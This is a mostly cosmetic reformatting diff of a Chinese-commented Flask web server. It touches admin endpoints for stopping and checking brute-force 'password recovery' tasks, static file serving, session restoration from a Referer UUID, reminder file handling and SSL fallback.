             # 判断是停止全部还是停止指定账号
             if data.get("all"):
                 result = brute_force_manager.stop_all_tasks()
-                logging.warning(f"[密码恢复] 超级管理员 {g.user} 停止了所有密码恢复任务")
+                logging.warning(
+                    f"[密码恢复] 超级管理员 {g.user} 停止了所有密码恢复任务"
+                )
                 return jsonify(result)
             elif "accounts" in data:
                 accounts = data["accounts"]
                 if not isinstance(accounts, list):
-                    return jsonify({"success": False, "message": "accounts必须是列表"}), 400
-                
+                    return (
+                        jsonify({"success": False, "message": "accounts必须是列表"}),
+                        400,
+                    )
+
                 results = []
                 for account in accounts:
                     result = brute_force_manager.stop_task(account)
                     results.append({"account": account, "result": result})
-                
-                logging.warning(f"[密码恢复] 超级管理员 {g.user} 停止了账号的密码恢复任务：{accounts}")
-                
-                return jsonify({
-                    "success": True,
-                    "message": f"已处理 {len(accounts)} 个停止请求",
-                    "results": results
-                })
+
+                logging.warning(
+                    f"[密码恢复] 超级管理员 {g.user} 停止了账号的密码恢复任务：{accounts}"
+                )
+
+                return jsonify(
+                    {
+                        "success": True,
+                        "message": f"已处理 {len(accounts)} 个停止请求",
+                        "results": results,
+                    }
+                )
             else:
-                return jsonify({"success": False, "message": "必须提供all或accounts参数"}), 400
-        
+                return (
+                    jsonify({"success": False, "message": "必须提供all或accounts参数"}),
+                    400,
+                )
+
         except Exception as e:
             logging.error(f"[密码恢复] 停止任务失败: {e}", exc_info=True)
-            return jsonify({"success": False, "message": f"停止任务失败: {str(e)}"}), 500
+            return (
+                jsonify({"success": False, "message": f"停止任务失败: {str(e)}"}),
+                500,
+            )
 
     @app.route("/api/admin/bruteforce/status", methods=["GET"])
     @login_required
@@ -19651,21 +19798,24 @@ def start_web_server(args_param):
             is_super_admin, error_response = check_super_admin_permission()
             if not is_super_admin:
                 return error_response
-            
+
             global brute_force_manager
             if not brute_force_manager:
-                return jsonify({"success": False, "message": "密码恢复管理器未初始化"}), 500
-            
+                return (
+                    jsonify({"success": False, "message": "密码恢复管理器未初始化"}),
+                    500,
+                )
+
             tasks = brute_force_manager.get_all_tasks_status()
-            
-            return jsonify({
-                "success": True,
-                "tasks": tasks
-            })
-        
+
+            return jsonify({"success": True, "tasks": tasks})
+
         except Exception as e:
             logging.error(f"[密码恢复] 获取任务状态失败: {e}", exc_info=True)
-            return jsonify({"success": False, "message": f"获取任务状态失败: {str(e)}"}), 500
+            return (
+                jsonify({"success": False, "message": f"获取任务状态失败: {str(e)}"}),
+                500,
+            )
 
     # ============================================================================
     # 应用主路由
@@ -19683,11 +19833,11 @@ def start_web_server(args_param):
         # [修正] 使用 strict=False 允许读取包含重复项的配置文件（保留最后一个值）
         # 同时设置 optionxform=str 保持大小写敏感，防止 LastUser/lastuser 冲突
         config = configparser.ConfigParser(strict=False)
-        config.optionxform = str 
-        
+        config.optionxform = str
+
         try:
             config.read(CONFIG_FILE, encoding="utf-8")
-            
+
             # [修正] 读取成功后，回写配置文件以清除重复项
             # 这会利用 ConfigParser 的特性，将重复键合并为最后一个值，并重写文件
             # 注意：这依赖于全局的 _write_config_with_comments 函数
@@ -19696,7 +19846,7 @@ def start_web_server(args_param):
                 logging.info("[配置] 已自动修复并清理配置文件中的重复项")
             except Exception as write_err:
                 logging.error(f"[配置] 尝试自动修复配置文件失败: {write_err}")
-                
+
         except Exception as e:
             logging.error(f"[配置] 读取配置文件失败 (get_frontend_config): {e}")
             # 如果读取失败，尝试使用默认配置继续，避免崩馈
@@ -19882,12 +20032,20 @@ def start_web_server(args_param):
         try:
             # 获取 main.py 所在目录
             base_dir = os.path.dirname(__file__)
-            script_dir = os.path.join(base_dir, 'scripts')
+            script_dir = os.path.join(base_dir, "scripts")
             # 确保目录存在
             if not os.path.exists(script_dir):
-                 logging.warning(f"请求 scripts 文件但目录不存在: {script_dir}")
-                 return jsonify({"success": False, "message": f"Scripts 文件 {filename} 未找到！"}), 404
-            
+                logging.warning(f"请求 scripts 文件但目录不存在: {script_dir}")
+                return (
+                    jsonify(
+                        {
+                            "success": False,
+                            "message": f"Scripts 文件 {filename} 未找到！",
+                        }
+                    ),
+                    404,
+                )
+
             return send_from_directory(script_dir, filename)
         except Exception as e:
             logging.error(f"Serving script error: {e}")
@@ -19901,11 +20059,19 @@ def start_web_server(args_param):
         try:
             # 获取 main.py 所在目录
             base_dir = os.path.dirname(__file__)
-            style_dir = os.path.join(base_dir, 'styles')
+            style_dir = os.path.join(base_dir, "styles")
             # 确保目录存在
             if not os.path.exists(style_dir):
-                 logging.warning(f"请求 styles 文件但目录不存在: {style_dir}")
-                 return jsonify({"success": False, "message": f"Styles 文件 {filename} 未找到！"}), 404
+                logging.warning(f"请求 styles 文件但目录不存在: {style_dir}")
+                return (
+                    jsonify(
+                        {
+                            "success": False,
+                            "message": f"Styles 文件 {filename} 未找到！",
+                        }
+                    ),
+                    404,
+                )
 
             return send_from_directory(style_dir, filename)
         except Exception as e:
@@ -20012,7 +20178,7 @@ def start_web_server(args_param):
             # 捕获并记录任何异常
             logging.error(f"[用户登出] 处理登出请求时发生错误: {e}", exc_info=True)
             return jsonify({"success": False, "message": f"登出失败: {str(e)}"}), 500
-        
+
     @app.route("/api/frontend_config.js")
     def get_frontend_config_javascript():
         """将前端配置以JavaScript形式返回，并尝试根据Referer恢复会话"""
@@ -20027,9 +20193,9 @@ def start_web_server(args_param):
                 uuid_match = re.search(
                     r"/uuid=([a-f0-9]{8}-[a-f0-9]{4}-4[a-f0-9]{3}-[89ab][a-f0-9]{3}-[a-f0-9]{12})",
                     referrer,
-                    re.IGNORECASE
+                    re.IGNORECASE,
                 )
-                
+
                 if uuid_match:
                     uuid = uuid_match.group(1)
                     # 执行原 session_view 的会话恢复逻辑
@@ -20052,7 +20218,9 @@ def start_web_server(args_param):
                                     f"[ConfigLoader] 从文件恢复已登录会话 : {uuid} (用户: {state.get('user_info', {}).get('username', 'Unknown')})"
                                 )
                             else:
-                                logging.info(f"[ConfigLoader] 初始化新会话结构 : {uuid} ")
+                                logging.info(
+                                    f"[ConfigLoader] 初始化新会话结构 : {uuid} "
+                                )
 
                             web_sessions[uuid] = api_instance
                         else:
@@ -20060,7 +20228,9 @@ def start_web_server(args_param):
                             api_instance = web_sessions[uuid]
                             if not hasattr(api_instance, "_web_session_id"):
                                 api_instance._web_session_id = uuid
-                            logging.debug(f"[ConfigLoader] 确认现有会话活跃: {uuid[:32]}...")
+                            logging.debug(
+                                f"[ConfigLoader] 确认现有会话活跃: {uuid[:32]}..."
+                            )
         except Exception as e:
             logging.error(f"[ConfigLoader] 尝试恢复会话时出错: {e}")
 
@@ -20069,11 +20239,10 @@ def start_web_server(args_param):
         # ==========================================
         app_config = get_frontend_config()
         config_script = f"window.APP_CONFIG = {json.dumps(app_config)};"
-        
+
         resp = make_response(config_script)
         resp.mimetype = "application/javascript"
         return resp
-
 
     @app.route("/")
     @app.route("/uuid=<uuid>")
@@ -20086,15 +20255,11 @@ def start_web_server(args_param):
                 re.IGNORECASE,
             )
             if not uuid_pattern.match(uuid):
-                logging.warning(
-                    f"无效的UUID格式: {uuid[:40]}... 重定向到首页"
-                )
+                logging.warning(f"无效的UUID格式: {uuid[:40]}... 重定向到首页")
                 return redirect(url_for("index"))
-        
+
         # 直接返回静态HTML，具体的配置和会话逻辑由 frontend_config.js 接口处理
         return render_template_string(html_content)
-
-
 
     # @app.route("/")
     # def index():
@@ -20158,129 +20323,129 @@ def start_web_server(args_param):
     #     modified_html = html_content.replace("</body>", f"{config_script}</body>")
     #     return render_template_string(modified_html)
 
-#     @app.route("/JavaScript/<path:function_path>.js", methods=["GET"])
-#     def serve_javascript(function_path):
-#         """
-#         JavaScript 函数动态加载 API 端点
-#         """
-#         if function_path == "JavaScript_globals":
-#             return redirect("/JavaScript_globals.js")
-#         try:
-#             js_file_path = os.path.join(os.path.dirname(__file__), "JavaScript.js")
-#             if not os.path.exists(js_file_path):
-#                 logging.error(f"JavaScript.js 文件不存在: {js_file_path}")
-#                 return jsonify({"error": "JavaScript file not found"}), 404
-#             with open(js_file_path, "r", encoding="utf-8") as f:
-#                 full_content = f.read()
-#             function_name = function_path.replace("/", "_")
-#             pattern = rf"(?:^|\n)(\s*(?:(?:async\s+)?function\s+{function_name}\s*\([^)]*\)|(?:const|let|var)\s+{function_name}\s*=\s*(?:function\s*\([^)]*\)|(?:async\s+)?function\s*\([^)]*\)|\([^)]*\)\s*=>))\s*{{)"
+    #     @app.route("/JavaScript/<path:function_path>.js", methods=["GET"])
+    #     def serve_javascript(function_path):
+    #         """
+    #         JavaScript 函数动态加载 API 端点
+    #         """
+    #         if function_path == "JavaScript_globals":
+    #             return redirect("/JavaScript_globals.js")
+    #         try:
+    #             js_file_path = os.path.join(os.path.dirname(__file__), "JavaScript.js")
+    #             if not os.path.exists(js_file_path):
+    #                 logging.error(f"JavaScript.js 文件不存在: {js_file_path}")
+    #                 return jsonify({"error": "JavaScript file not found"}), 404
+    #             with open(js_file_path, "r", encoding="utf-8") as f:
+    #                 full_content = f.read()
+    #             function_name = function_path.replace("/", "_")
+    #             pattern = rf"(?:^|\n)(\s*(?:(?:async\s+)?function\s+{function_name}\s*\([^)]*\)|(?:const|let|var)\s+{function_name}\s*=\s*(?:function\s*\([^)]*\)|(?:async\s+)?function\s*\([^)]*\)|\([^)]*\)\s*=>))\s*{{)"
 
-#             match = re.search(pattern, full_content, re.MULTILINE)
+    #             match = re.search(pattern, full_content, re.MULTILINE)
 
-#             if not match:
-#                 logging.warning(
-#                     f"未找到精确匹配的函数 '{function_name}'，尝试模糊搜索..."
-#                 )
-#                 fuzzy_pattern = rf"(?:^|\n)(\s*(?:function\s+\w*{function_name}\w*\s*\([^)]*\)|(?:const|let|var)\s+\w*{function_name}\w*\s*=))"
-#                 fuzzy_matches = re.finditer(
-#                     fuzzy_pattern, full_content, re.MULTILINE | re.IGNORECASE
-#                 )
-#                 found_functions = []
-#                 for m in fuzzy_matches:
-#                     func_line = m.group(0).strip()
-#                     found_functions.append(func_line[:50])
+    #             if not match:
+    #                 logging.warning(
+    #                     f"未找到精确匹配的函数 '{function_name}'，尝试模糊搜索..."
+    #                 )
+    #                 fuzzy_pattern = rf"(?:^|\n)(\s*(?:function\s+\w*{function_name}\w*\s*\([^)]*\)|(?:const|let|var)\s+\w*{function_name}\w*\s*=))"
+    #                 fuzzy_matches = re.finditer(
+    #                     fuzzy_pattern, full_content, re.MULTILINE | re.IGNORECASE
+    #                 )
+    #                 found_functions = []
+    #                 for m in fuzzy_matches:
+    #                     func_line = m.group(0).strip()
+    #                     found_functions.append(func_line[:50])
 
-#                 if found_functions:
-#                     suggestions = "\n".join(found_functions)
-#                     logging.info(f"找到相似的函数定义:\n{suggestions}")
-#                     return (
-#                         jsonify(
-#                             {
-#                                 "error": f"Function '{function_name}' not found",
-#                                 "suggestions": found_functions[:5],
-#                             }
-#                         ),
-#                         404,
-#                     )
-#                 else:
-#                     logging.error(f"未找到任何与 '{function_name}' 相关的函数")
-#                     return (
-#                         jsonify({"error": f"Function '{function_name}' not found"}),
-#                         404,
-#                     )
-#             func_start = match.start()
-#             brace_count = 0
-#             in_function = False
-#             func_end = func_start
+    #                 if found_functions:
+    #                     suggestions = "\n".join(found_functions)
+    #                     logging.info(f"找到相似的函数定义:\n{suggestions}")
+    #                     return (
+    #                         jsonify(
+    #                             {
+    #                                 "error": f"Function '{function_name}' not found",
+    #                                 "suggestions": found_functions[:5],
+    #                             }
+    #                         ),
+    #                         404,
+    #                     )
+    #                 else:
+    #                     logging.error(f"未找到任何与 '{function_name}' 相关的函数")
+    #                     return (
+    #                         jsonify({"error": f"Function '{function_name}' not found"}),
+    #                         404,
+    #                     )
+    #             func_start = match.start()
+    #             brace_count = 0
+    #             in_function = False
+    #             func_end = func_start
 
-#             for i in range(func_start, len(full_content)):
-#                 char = full_content[i]
+    #             for i in range(func_start, len(full_content)):
+    #                 char = full_content[i]
 
-#                 if char == "{":
-#                     brace_count += 1
-#                     in_function = True
-#                 elif char == "}":
-#                     brace_count -= 1
-#                     if in_function and brace_count == 0:
-#                         func_end = i + 1
-#                         break
-#             function_code = full_content[func_start:func_end]
-#             comments_start = func_start
-#             lines_before = full_content[:func_start].split("\n")
-#             comment_lines = []
+    #                 if char == "{":
+    #                     brace_count += 1
+    #                     in_function = True
+    #                 elif char == "}":
+    #                     brace_count -= 1
+    #                     if in_function and brace_count == 0:
+    #                         func_end = i + 1
+    #                         break
+    #             function_code = full_content[func_start:func_end]
+    #             comments_start = func_start
+    #             lines_before = full_content[:func_start].split("\n")
+    #             comment_lines = []
 
-#             for line in reversed(lines_before):
-#                 stripped = line.strip()
-#                 if (
-#                     stripped.startswith("//")
-#                     or stripped.startswith("/*")
-#                     or stripped.startswith("*")
-#                     or stripped.startswith("*/")
-#                 ):
-#                     comment_lines.insert(0, line)
-#                 elif stripped == "":
-#                     comment_lines.insert(0, line)
-#                 else:
-#                     break
-#             if comment_lines:
-#                 comments = "\n".join(comment_lines)
-#                 function_code = comments + "\n" + function_code
-#             response_content = f"""// ==============================================================================
-# // 动态加载的 JavaScript 函数: {function_name}
-# // 从 JavaScript.js 文件中提取
-# // ==============================================================================
+    #             for line in reversed(lines_before):
+    #                 stripped = line.strip()
+    #                 if (
+    #                     stripped.startswith("//")
+    #                     or stripped.startswith("/*")
+    #                     or stripped.startswith("*")
+    #                     or stripped.startswith("*/")
+    #                 ):
+    #                     comment_lines.insert(0, line)
+    #                 elif stripped == "":
+    #                     comment_lines.insert(0, line)
+    #                 else:
+    #                     break
+    #             if comment_lines:
+    #                 comments = "\n".join(comment_lines)
+    #                 function_code = comments + "\n" + function_code
+    #             response_content = f"""// ==============================================================================
+    # // 动态加载的 JavaScript 函数: {function_name}
+    # // 从 JavaScript.js 文件中提取
+    # // ==============================================================================
 
-# {function_code}
-# """
+    # {function_code}
+    # """
 
-#             response = make_response(response_content)
-#             response.headers["Content-Type"] = "application/javascript; charset=utf-8"
+    #             response = make_response(response_content)
+    #             response.headers["Content-Type"] = "application/javascript; charset=utf-8"
 
-#             response.headers["Cache-Control"] = "public, max-age=3600"
-#             file_mtime = os.path.getmtime(js_file_path)
-#             last_modified = datetime.datetime.fromtimestamp(file_mtime).strftime(
-#                 "%a, %d %b %Y %H:%M:%S GMT"
-#             )
-#             response.headers["Last-Modified"] = last_modified
-#             etag = hashlib.md5(function_code.encode("utf-8")).hexdigest()
-#             response.headers["ETag"] = f'"{etag}"'
-#             if_modified_since = request.headers.get("If-Modified-Since")
-#             if_none_match = request.headers.get("If-None-Match")
-#             if (if_modified_since == last_modified) or (if_none_match == f'"{etag}"'):
-#                 logging.debug(f"JavaScript 函数 '{function_name}' 使用缓存版本 (304)")
-#                 return "", 304
+    #             response.headers["Cache-Control"] = "public, max-age=3600"
+    #             file_mtime = os.path.getmtime(js_file_path)
+    #             last_modified = datetime.datetime.fromtimestamp(file_mtime).strftime(
+    #                 "%a, %d %b %Y %H:%M:%S GMT"
+    #             )
+    #             response.headers["Last-Modified"] = last_modified
+    #             etag = hashlib.md5(function_code.encode("utf-8")).hexdigest()
+    #             response.headers["ETag"] = f'"{etag}"'
+    #             if_modified_since = request.headers.get("If-Modified-Since")
+    #             if_none_match = request.headers.get("If-None-Match")
+    #             if (if_modified_since == last_modified) or (if_none_match == f'"{etag}"'):
+    #                 logging.debug(f"JavaScript 函数 '{function_name}' 使用缓存版本 (304)")
+    #                 return "", 304
 
-#             logging.info(
-#                 f"成功返回 JavaScript 函数: {function_name} ({len(function_code)} 字符)"
-#             )
-#             return response
+    #             logging.info(
+    #                 f"成功返回 JavaScript 函数: {function_name} ({len(function_code)} 字符)"
+    #             )
+    #             return response
 
-#         except FileNotFoundError as e:
-#             logging.error(f"JavaScript.js 文件未找到: {e}")
-#             return jsonify({"error": "JavaScript file not found"}), 404
-#         except Exception as e:
-#             logging.error(f"加载 JavaScript 函数时发生错误: {e}", exc_info=True)
-#             return jsonify({"error": "Internal server error"}), 500
+    #         except FileNotFoundError as e:
+    #             logging.error(f"JavaScript.js 文件未找到: {e}")
+    #             return jsonify({"error": "JavaScript file not found"}), 404
+    #         except Exception as e:
+    #             logging.error(f"加载 JavaScript 函数时发生错误: {e}", exc_info=True)
+    #             return jsonify({"error": "Internal server error"}), 500
 
     # @app.route("/JavaScript_globals.js", methods=["GET"])
     # def serve_javascript_globals():
@@ -21436,7 +21601,7 @@ def start_web_server(args_param):
         except json.JSONDecodeError as e:
             logging.error(f"[定时提醒] JSON解析失败: {e}")
             logging.warning("[定时提醒] 检测到提醒文件损坏，正在直接清空并重建...")
-            
+
             # 强制清空重建
             try:
                 with open(reminders_file, "w", encoding="utf-8") as f:
@@ -21713,7 +21878,7 @@ def start_web_server(args_param):
                 # [修正] 捕获JSON解析错误（如文件为空），防止崩溃
                 logging.warning(f"[定时提醒] 提醒文件损坏或为空，已重置: {e}")
                 all_reminders = []
-            
+
             active_reminders = []
             for reminder in all_reminders:
                 if not reminder.get("enabled", False):
@@ -23054,7 +23219,7 @@ def start_web_server(args_param):
             ssl_config["ssl_enabled"] = False
             ssl_config["https_only"] = False
             save_ssl_config(ssl_config)
-            
+
         # 只有当验证通过且配置仍然启用时，才尝试创建上下文
         if ssl_config["ssl_enabled"]:
             try:
@@ -23086,16 +23251,16 @@ def start_web_server(args_param):
                 print(f"系统将自动禁用SSL并切换回HTTP模式运行。")
                 print(f"{'='*60}\n")
                 logging.error(f"创建SSL上下文失败: {e}", exc_info=True)
-                
+
                 # 自动关闭SSL
                 ssl_config["ssl_enabled"] = False
                 ssl_config["https_only"] = False
                 save_ssl_config(ssl_config)
                 ssl_context = None
-    
+
     # 二次检查：如果刚才因为错误禁用了SSL，这里会打印日志
     if not ssl_config.get("ssl_enabled", False):
-         logging.info("SSL未启用（或已自动禁用），服务器将以HTTP模式运行")
+        logging.info("SSL未启用（或已自动禁用），服务器将以HTTP模式运行")
 
     # ============================================================================
     # 添加请求钩子：处理X-Forwarded-*头和HTTPS重定向
@@ -23181,9 +23346,7 @@ def start_web_server(args_param):
         _send_startup_notification_to_log_forwarder(args.host, args.port)
 
     udp_notification_thread = threading.Thread(
-        target=trigger_udp_notification,
-        daemon=True,
-        name="UDP_Startup_Notification"
+        target=trigger_udp_notification, daemon=True, name="UDP_Startup_Notification"
     )
     udp_notification_thread.start()
     logging.info("[系统启动] UDP通知服务线程已启动")
@@ -23307,10 +23470,10 @@ def start_web_server(args_param):
             try:
                 # 因为上方已经统一启动了 udp_notification_thread
 
-                @socketio.on('connect', namespace='/')
+                @socketio.on("connect", namespace="/")
                 def on_first_connect():
                     """首次连接时触发UDP通知（仅执行一次，作为健康检查的补充）"""
-                    if not hasattr(on_first_connect, 'notified'):
+                    if not hasattr(on_first_connect, "notified"):
                         on_first_connect.notified = True
                         # 仅记录日志，主要通知任务交由主线程启动的 trigger_udp_notification 处理
                         logging.debug("[SocketIO] 客户端首次连接确认")
